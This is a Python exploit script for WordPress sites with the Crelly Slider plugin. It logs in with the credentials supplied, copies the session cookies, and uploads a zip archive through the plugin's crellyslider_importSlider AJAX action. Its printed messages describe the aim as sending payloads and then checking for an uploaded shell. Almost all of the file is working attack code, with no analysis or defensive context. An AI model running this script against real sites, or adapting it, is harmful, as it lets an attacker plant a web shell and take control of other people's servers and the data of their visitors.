# coding=utf-8
import requests, sys
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'


def Exploit(site, username, password):
    print('[!] Exploit Started! --> {}'.format(site))
    Login = 'http://' + site + '/wp-login.php'
    HeadersLogin = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://localhost',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,'
                  'image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Sec-Fetch-Site': 'same-origin',
        'Referer': 'http://{}/wp-login.php?loggedout=true'.format(site),
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    LoginData = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log+In',
        'redirect_to': 'http://{}/wp-admin/'.format(site),
        'testcookie': 1
    }
    Login = requests.post(Login, data=LoginData, headers=HeadersLogin, timeout=10)
    if 'wordpress_logged_in' in str(Login.cookies):
        print(' [+] Step 1 Done! successfully Logged In!')
        Exp = 'http://' + site + '/wp-admin/admin-ajax.php'
        print(' [+] Step 2 started! Trying Set Cookies!')
        Huntcok = str(Login.cookies)
        try:
            PHPSESSID = Login.cookies['PHPSESSID']
            wploggedin = 'wordpress_logged_in_' + Huntcok.split('wordpress_logged_in_')[1].split(' for ')[0]
            print(' [!] Cookies Set successfully!')
        except:
            print(' [-] Cookies Set Failed!')
            sys.exit()
        try:
            wpbff = 'wordpress_bbf' + Huntcok.split('wordpress_bbf')[1].split(' for ')[0]
            print(' [+] ALL Cookies Sets successfully!')
        except:
            print(' [-] Cookies Set Failed!')
            sys.exit()

        Headers = {
            'Origin': 'http://localhost',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0',
            'X-Requested-With': 'XMLHttpRequest',
            'Sec-Fetch-Mode': 'cors',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryHdKriGTCwKotJRjx',
            'Sec-Fetch-Site': 'same-origin',
            'Referer': 'http://{}/wp-admin/admin.php'.format(site),
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Set-Cookie': "{};PHPSESSID={};{};{};".format(wploggedin,PHPSESSID,wpbff,
                                                         'wordpress_test_cookie=WP+Cookie+check')
        }
        PostData = {
            'action': 'crellyslider_importSlider',
            'file': open('files/rock.zip', 'rb')
        }
        rr = requests.post(Exp, data=PostData, headers=Headers)
        print(' [+] Step 3 Done! successfully Sent Payloads!')
        print(' [!] Step 4 Started! Checking For Uploaded Shell...')
        print(rr.content)


